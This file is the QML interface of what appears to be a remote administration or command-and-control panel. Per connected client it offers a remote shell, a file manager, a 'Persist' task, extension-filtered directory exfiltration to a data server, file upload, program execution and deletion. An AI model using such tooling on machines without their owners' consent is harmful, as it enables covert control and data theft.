// Copyright (c) Nouman Tajik [github.com/tajiknomi]
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.


import QtQuick.Controls.Basic
import QtQuick
import QtQuick.Window
import QtQuick.Controls
import QtQuick.Layouts

Window {
    id: root
    width: 1048
    height: 650
    visible: true
    title: qsTr("Client Panel")

    Connections {           // Signal handler to receive DataServer IP from C++
        target: httpServer
        function onSendDataServerIP(dataServer) {
           dataServerIp = dataServer
        }
    }

    Connections {           // Signal handler to recieve prompts from C++
        target: httpServer
        function onDisplayPromptQML(clientUsername, promptMsg) {
            openPrompt(clientUsername, promptMsg)
        }
    }

    function openPrompt(promptTitle, message){      // Show prompt msg
        // Prompt the user with a dialog
        let component = Qt.createComponent("ShowPrompt.qml");
        if (component.status === Component.Ready) {
            let dialog = component.createObject(root);

            if (dialog !== null) {
                dialog.message = message
                dialog.promptTitle = promptTitle
                dialog.show()

                // Connect to the close signal to destroy the object
                dialog.closing.connect(function() {
                    dialog.destroy();
                });
            }
        }
        else {
            console.error("Error loading component:", component.errorString())
        }
    }

    function createFilemanagerWindow(id, user) {
        let component = Qt.createComponent("Filemanager.qml"); // Replace with your component's path
        if (component.status === Component.Ready) {
            let username = user;
            let port_length = downloadingPort_rect.port_input.length;
            let port = downloadingPort_rect.port_input.getText(0, port_length);

            let window = component.createObject(root, {
                "id": id,
                "username": username,
                "dataServerIp": dataServerIp,
                "port": port
            });

            if (window !== null) {
                window.show();

                // Connect to the close signal to destroy the object
                window.closing.connect(function() {
                    window.destroy();
                });

            }
            else {
                console.error("Error creating window object");
            }
        }
        else {
            console.error("Error loading component:", component.errorString());
        }
    }

    function createShellWindow(id, user) {

        let component = Qt.createComponent("ShellWindow.qml"); // Replace with your component's path
        if (component.status === Component.Ready) {
            let username = user;
            let port_length = downloadingPort_rect.port_input.length;
            let port = downloadingPort_rect.port_input.getText(0, port_length);

            let window = component.createObject(root, {
                "id": id,
                "username": username,
            });

            if (window !== null) {
                window.show();

                // Connect to the close signal to destroy the object
                window.closing.connect(function() {
                    window.destroy();
                });

            }
            else {
                console.error("Error creating window object");
            }
        }
        else {
            console.error("Error loading component:", component.errorString());
        }
    }

    property string dataServerIp

    Button {
        id: listen_btn
        property string buttonText: "LISTEN"
        text: buttonText
        font.pixelSize: 18

        background: Rectangle {
            color: "seashell"
            implicitWidth: 100
            implicitHeight: 40
            border.width: 1
        }

        anchors {
            top: parent.top
            topMargin: 60
            left: parent.left
            leftMargin: 20
        }

        onClicked: {
            let portText = listeningPort_rect.port_input.text.trim();
            console.log(portText)
            let port = parseInt(portText);

            if (text === buttonText) {
                // Validate input
                if (portText === "" || isNaN(port) || port < 1 || port > 65535) {
                    console.warn("Invalid port! Please enter a number between 1 and 65535.");
                    openPrompt("Invalid Data Port", "Please enter a number between 1 and 65535.");
                    listeningPort_rect.port_input.borderColor = "red";
                    return;
                }

                // Optional: reset border color on valid input
                //listeningPort_rect.port_input.borderColor = "lightgray";

                // Start server
                let returnValue = httpServer.startCRCServer(port);
                if (returnValue === 0) {
                    text = "STOP";
                   // listeningPort_rect.port_input.readOnly = true;  // prevent editing while server is running
                    httpServer.startApacheServer();                 // Start the portable-apache server here

                } else {
                    console.warn("Failed to start server on port " + port);
                    openPrompt("Invalid Data Port", "Failed to start server on port " + port);
                }

            } else {
                // Stop server
                httpServer.stopCRCServer();
                httpServer.stopApacheServer();                 // Stop the portable-apache server here
                text = buttonText;
               // listeningPort_rect.port_input.readOnly = false;  // re-enable editing
            }
        }
    }

    Text {
        id: controlTxt
        text: "Control"
        font.pixelSize: 16
        anchors {
            top: listen_btn.bottom
            horizontalCenter: listen_btn.horizontalCenter
            margins: 25
        }
    }

    Rectangle {
        id: listeningPort_rect
        property alias port_input: text_port_input
        width: 60
        height: 30
        color: "transparent"
        border.color: "grey"
        clip: true
        anchors {
            top: controlTxt.bottom
            margins: 5
            horizontalCenter: listen_btn.horizontalCenter
        }

        TextInput {
            id: text_port_input
            text: "80"
            font.pixelSize: 20
            selectByMouse: true
            // anchors.centerIn: parent
            anchors.fill: parent
            validator: IntValidator {bottom: 1; top: 100000} // only accept digits as INPUT
            focus: true
        }
    }

    Text {
        id: dataTxt
        text: "Data"
        font.pixelSize: 16
        anchors {
            top: listeningPort_rect.bottom
            horizontalCenter: listen_btn.horizontalCenter
            margins: 15
        }
    }

    Rectangle {
        id: downloadingPort_rect
        property alias port_input: downloadingPort_input
        width: 70
        height: 40
        color: "transparent"
        border.color: "grey"
        radius: 4
        clip: true

        anchors {
            top: dataTxt.bottom
            margins: 5
            horizontalCenter: listeningPort_rect.horizontalCenter
        }

        TextField {
            id: downloadingPort_input
            property color borderColor: "lightgray"

            font.pixelSize: 20
            anchors.fill: parent
            padding: 5
            selectByMouse: true
            placeholderText: "Port"
            validator: IntValidator { bottom: 1; top: 65535 }

            background: Rectangle {
                radius: 4
                color: "white"
                border.color: downloadingPort_input.borderColor
                border.width: 1
            }
        }
    }

    Rectangle {
        id: clients_main_rect
        width: parent.width
        height: parent.height
        border.color: "black"
        color: "transparent"

        anchors {
            top: parent.top
            bottom: parent.bottom
            left: listen_btn.right
            right: parent.right
            margins: 20
        }

        Clients_header {
            id: clients_rect
        }
    }

    ListView {
        id: list
        height: root.height - 100
        width: parent.width
        model: clients.mClients         // mClients is QList<QObject*>
        delegate: itemDelegate
        focus: true
        anchors {
            left:clients_main_rect.left
            top: clients_main_rect.top
            leftMargin: 5
            topMargin: 32
        }
    }

    Component {
        id: itemDelegate
        Rectangle {
            id: itemRect
            width: clients_main_rect.width - 8
            height: 30
            color: ListView.isCurrentItem ? "lightgrey" : "transparent"
            property int fontsize: 14
            MouseArea {
                anchors.fill: parent
                acceptedButtons: Qt.LeftButton | Qt.RightButton
     //           acceptedButtons: Qt.RightButton
                onClicked: (mouse)=>{
                               if (mouse.button === Qt.RightButton){
                                   contextMenu.popup()
                               }
                           }
                onPressAndHold: (mouse)=>{
                                    if (mouse.source === Qt.MouseEventNotSynthesized)
                                    contextMenu.popup()
                                }
                Menu {
                    id: contextMenu
                    font.pixelSize: 12 // Set font size for the entire menu bar
                    Action {
                        text: "Shell"
                        onTriggered: {
                            // let mode = "shell";
                            // let exePath = "echo \"Client is ready to recieve commands now\"";
                            // let jsonObj = {
                            //     id: modelData.id,
                            //     mode: mode,
                            // };
                            //  let jsonString = JSON.stringify(jsonObj);
                            //  httpServer.registerTaskForClient(jsonString);
                            createShellWindow(modelData.id, modelData.username);
                        }
                     }

                    Action {
                        text: "Filemanager"                        
                        onTriggered: {                            
                            let mode = "listDir";
                            let dirToList = ""
                            let jsonObj = {
                                id: modelData.id,
                                mode: mode,
                                dirToList: dirToList,
                            };
                            let jsonString = JSON.stringify(jsonObj);
                            httpServer.registerTaskForClient(jsonString);
                            createFilemanagerWindow(modelData.id, modelData.username)
                        }
                    }

                    Action { text: "Persist"
                        onTriggered: {
                            let mode = "persist";
                            let method = "";
                            let jsonObj = {
                                id: modelData.id,
                                mode: mode,
                                method: method,
                            };
                            let jsonString = JSON.stringify(jsonObj);
                            httpServer.registerTaskForClient(jsonString);
                        }
                    }

                    MenuSeparator { }

                    Menu {
                        title: "download"
                        Action {
                            text: "File"
                            onTriggered: itemDownload_id.openUploadDialog()
                        }
                        Dialog1 {
                            id: itemDownload_id
                            title: "download item"
                            txt: "path (e.g. c:/users/john/Desktop/file.txt)"
                            upload_dialog.onAccepted: {
                                let id = modelData.id
                                let mode = "uploadFile"
                                let filePath_length = itemDownload_id.txtField.length;
                                let filePath = itemDownload_id.txtField.getText(0,filePath_length);
                                let port_length = downloadingPort_rect.port_input.length;
                                let port = downloadingPort_rect.port_input.getText(0, port_length);

                                if((filePath_length > 0) && (port_length > 0)){

                                    let jsonObj = {
                                        id: id,
                                        mode: mode,
                                        url: dataServerIp,
                                        port: port,
                                        filePath: filePath,
                                    };

                                    let jsonString = JSON.stringify(jsonObj);                                    
                                    httpServer.registerTaskForClient(
                                                jsonString
                                                );
                                }
                            }
                        }

                        Action {
                            text: "Directory"
                            onTriggered: dirDownload_id.openUploadDialog()
                        }
                        Dialog2 {
                            id: dirDownload_id
                            title: "download directory"
                            txt1: "Path (e.g. /home/ubuntu/Desktop/)"
                            txt2: "Extension(s) (e.g. .doc,.pdf)"
                            upload_dialog.onAccepted: {
                                let seperator = "***";
                                let id = modelData.id
                                let mode = "UploadDir"
                                let dirPath_length = dirDownload_id.txtField1.length;
                                let dirPath = dirDownload_id.txtField1.getText(0,dirPath_length).toString();
                                let fileExtensions_length = dirDownload_id.txtField2.length;
                                let fileExtensions = dirDownload_id.txtField2.getText(0,fileExtensions_length).toString();
                                let port_length = downloadingPort_rect.port_input.length;
                                let port = downloadingPort_rect.port_input.getText(0,port_length);

                                if((dirPath_length > 0) && (port_length > 0)){
                                    let jsonObj = {
                                        id: id,
                                        mode: mode,
                                        url: dataServerIp,
                                        port: port,
                                        dirPath: dirPath,
                                        fileExtensions:fileExtensions
                                    };

                                    let jsonString = JSON.stringify(jsonObj);
                                    httpServer.registerTaskForClient(
                                                jsonString
                                                );
                                }
                            }
                        }
                    }
                    Action {
                        text: "Upload"
                        onTriggered: upload_dialog_id.openUploadDialog()
                    }

                    Dialog2 {
                        id: upload_dialog_id
                        title: "Upload item"
                        txt1: "Source Path (e.g. packages/file.txt)"
                        txt2: "Destination Path (e.g. c:/programdata/data/)"
                        upload_dialog.onAccepted: {
                            let id = modelData.id
                            let mode = "downloadFile"
                            let filePath_length = upload_dialog_id.txtField1.length;
                            let filePath = upload_dialog_id.txtField1.getText(0,filePath_length).toString();
                            let destPath_length = upload_dialog_id.txtField2.length;
                            let destPath = upload_dialog_id.txtField2.getText(0,destPath_length).toString();
                            let port_length = downloadingPort_rect.port_input.length;
                            let port = downloadingPort_rect.port_input.getText(0, port_length);

                            if(port_length > 0 && filePath_length > 0 && destPath_length > 0){
                                let jsonObj = {
                                    id: id,
                                    mode: mode,
                                    url: dataServerIp,
                                    port: port,
                                    filePath: filePath,
                                    destPath: destPath
                                };

                                let jsonString = JSON.stringify(jsonObj);
                                httpServer.registerTaskForClient(
                                            jsonString
                                            );
                            }
                        }
                    }

                    Action {
                        text: "Execute"
                        onTriggered: exec_dialog_id.openUploadDialog()
                    }

                    Dialog1 {
                        id: exec_dialog_id
                        title: "execute"
                        txt: "Path (e.g. path/to/myProg.exe <arg1> <arg2>..<argn>)"
                        upload_dialog.onAccepted: {
                            let id = modelData.id
                            let mode = "execute"
                            let inputLength = exec_dialog_id.txtField.length;
                            let inputString = exec_dialog_id.txtField.getText(0,inputLength).toString();
                            // Regular expression to match quoted parts (single or double) or single words
                            let parts = inputString.match(/(["'])(?:(?=(\\?))\2.)*?\1|\S+/g);
                            // Remove quotes from the first part (exePath) if present
                            let exePath = parts[0].replace(/^['"]|['"]$/g, '');
                            // Join the rest as arguments
                            let args = parts.slice(1).join(" ");

                            if(inputLength > 0){
                                let jsonObj = {
                                    id: id,
                                    mode: mode,
                                    exePath: exePath,
                                    exeArguments: args,
                                };

                                let jsonString = JSON.stringify(jsonObj);
                                httpServer.registerTaskForClient(
                                            jsonString
                                            );
                            }
                        }
                    }

                    Action {
                        text: "Delete"
                        onTriggered: removeFile_id.openUploadDialog()
                    }

                    Dialog1 {
                        id: removeFile_id
                        title: "remove"
                        txt: "Path to file/dir (e.g. /home/ubuntu/Desktop/file.txt)"
                        upload_dialog.onAccepted: {
                            let id = modelData.id
                            let mode = "deleteFile"
                            let filePathLength = removeFile_id.txtField.length;
                            let filePath = removeFile_id.txtField.getText(0,filePathLength).toString();

                            if(filePathLength > 0){
                                let jsonObj = {
                                    id: id,
                                    mode: mode,
                                    filePath: filePath,
                                };

                                let jsonString = JSON.stringify(jsonObj);
                                httpServer.registerTaskForClient(
                                            jsonString
                                            );
                            }
                        }
                    }
                }
                Row {
                    Rectangle {
                        height: clients_rect.username_rect.height
                        width:  clients_rect.username_rect.width
                        clip: true
                        color: "transparent"
                        Text {
                            id: username
                            text: modelData.username
                            font.pixelSize: fontsize
                            anchors.centerIn: parent
                        }
                        MouseArea {
                            anchors.fill: parent
                            hoverEnabled: true
                            onClicked: {list.currentIndex = index;}

                        }
                    }
                    Rectangle {
                        implicitHeight: clients_rect.sys_rect.height
                        implicitWidth: clients_rect.sys_rect.width
                        clip: true
                        color: "transparent"
                        Text {
                            id: system
                            text: modelData.systemname
                            font.pixelSize: fontsize
                            anchors.centerIn: parent
                        }
                        MouseArea {
                            anchors.fill: parent
                            hoverEnabled: true
                            onClicked: {list.currentIndex = index;}

                        }
                    }
                    Rectangle {
                        implicitHeight: clients_rect.ip_rect.height
                        implicitWidth: clients_rect.ip_rect.width
                        clip: true
                        color: "transparent"
                        Text {
                            id: ip
                            text: modelData.ip
                            font.pixelSize: fontsize
                            anchors.centerIn: parent
                        }
                        MouseArea {
                            anchors.fill: parent
                            hoverEnabled: true
                            onClicked: list.currentIndex = index;
                        }
                    }
                    Rectangle {
                        height: clients_rect.os_rect.height
                        width: clients_rect.os_rect.width
                        clip: true
                        color: "transparent"
                        Text {
                            id: os
                            text: modelData.os
                            font.pixelSize: fontsize
                            anchors.centerIn: parent
                        }
                        MouseArea {
                            anchors.fill: parent
                            hoverEnabled: true
                            onClicked: list.currentIndex = index;
                        }
                    }
                    Rectangle {
                        height: clients_rect.location_rect.height
                        width: clients_rect.location_rect.width
                        clip: true
                        color: "transparent"
                        Text {
                            id: location
                            text: modelData.location
                            font.pixelSize: fontsize
                            anchors.centerIn: parent
                        }
                        MouseArea {
                            anchors.fill: parent
                            hoverEnabled: true
                            onClicked: list.currentIndex = index;
                        }
                    }
                }
            }
        }
    }
}
